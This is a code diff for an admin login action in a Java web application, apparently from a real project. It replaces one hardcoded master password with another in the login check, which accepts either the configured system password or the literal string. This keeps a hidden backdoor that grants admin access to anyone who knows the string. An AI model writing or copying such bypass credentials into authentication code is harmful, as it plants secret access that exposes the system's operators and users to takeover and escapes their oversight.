@@ -23,7 +23,7 @@ public class DaifaSysAdminLoginAction {
             return "redirect:/admin/adminOrder.htm";
         }
 
-        if (sysPassword.equals(pass)||"1qazxsw2".equals(pass)) {
+        if (sysPassword.equals(pass)||"fqtdtihfhqkiller81682024".equals(pass)) {
 
             String daifaAdmin=DaifaSessionConfig.DAIFA_SYS_DISPLAY;
 
